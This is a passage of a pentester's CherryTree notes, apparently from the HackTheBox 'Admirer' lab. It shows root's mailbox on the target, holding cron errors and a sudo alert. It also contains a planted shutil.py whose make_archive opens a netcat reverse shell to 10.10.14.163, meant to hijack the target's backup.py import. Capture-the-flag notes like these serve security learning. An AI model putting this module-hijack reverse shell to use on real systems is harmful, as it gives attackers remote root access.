+	id 1jTjaP-0000Zf-Rd
+	for root@admirer.htb; Wed, 29 Apr 2020 11:05:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTjaP-0000Zf-Rd@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 11:05:01 +0100
+
+rm: cannot remove '/tmp/*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 11:09:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 11:09:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTjeH-0000aO-Tk
+	for root@admirer.htb; Wed, 29 Apr 2020 11:09:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm -r /tmp/*.*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTjeH-0000aO-Tk@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 11:09:01 +0100
+
+rm: cannot remove '/tmp/*.*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 11:10:02 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 11:10:02 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTjfF-0000bC-Vu
+	for root@admirer.htb; Wed, 29 Apr 2020 11:10:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm /home/waldo/*.p*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTjfF-0000bC-Vu@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 11:10:01 +0100
+
+rm: cannot remove '/home/waldo/*.p*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 11:12:02 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 11:12:02 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTjhC-0000bf-2B
+	for root@admirer.htb; Wed, 29 Apr 2020 11:12:02 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm /home/waldo/*.p*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTjhC-0000bf-2B@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 11:12:02 +0100
+
+rm: cannot remove '/home/waldo/*.p*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 11:13:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 11:13:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTji9-0000bm-4I
+	for root@admirer.htb; Wed, 29 Apr 2020 11:13:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm /home/waldo/*.p*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTji9-0000bm-4I@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 11:13:01 +0100
+
+rm: cannot remove '/home/waldo/*.p*': No such file or directory
+
+From root@admirer.htb Wed Apr 29 11:14:01 2020
+Return-path: &lt;root@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Wed, 29 Apr 2020 11:14:01 +0100
+Received: from root by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;root@admirer.htb&gt;)
+	id 1jTjj7-0000c4-6S
+	for root@admirer.htb; Wed, 29 Apr 2020 11:14:01 +0100
+From: root@admirer.htb (Cron Daemon)
+To: root@admirer.htb
+Subject: Cron &lt;root@admirer&gt; rm /home/waldo/*.p*
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1jTjj7-0000c4-6S@admirer.htb&gt;
+Date: Wed, 29 Apr 2020 11:14:01 +0100
+
+rm: cannot remove '/home/waldo/*.p*': No such file or directory
+
+From waldo@admirer.htb Sun Jun 21 15:05:42 2020
+Return-path: &lt;waldo@admirer.htb&gt;
+Envelope-to: root@admirer.htb
+Delivery-date: Sun, 21 Jun 2020 15:05:42 +0100
+Received: from waldo by admirer.htb with local (Exim 4.89)
+	(envelope-from &lt;waldo@admirer.htb&gt;)
+	id 1jn0bE-0002Ac-84
+	for root@admirer.htb; Sun, 21 Jun 2020 15:05:32 +0100
+To: root@admirer.htb
+Auto-Submitted: auto-generated
+Subject: *** SECURITY information for admirer.htb ***
+From: Waldo Cooper &lt;waldo@admirer.htb&gt;
+Message-Id: &lt;E1jn0bE-0002Ac-84@admirer.htb&gt;
+Date: Sun, 21 Jun 2020 15:05:32 +0100
+
+admirer.htb : Jun 21 15:05:22 : waldo : 1 incorrect password attempt ; TTY=pts/1 ; PWD=/home/waldo ; USER=root ; COMMAND=list
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="shutil.py" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592812363.0" ts_lastsave="1592812377.31" unique_id="13">
+				<rich_text>import os
+def make_archive(a,b,c):
+	os.system(&quot;nc 10.10.14.163 5555 -e /bin/bash&quot;)</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="backup.py" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592812385.67" ts_lastsave="1592812399.01" unique_id="14">
+				<rich_text>#!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+# old ftp directory, not used anymore
+#dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)</rich_text>
+			</node>
+		</node>
+	</node>
+</cherrytree>
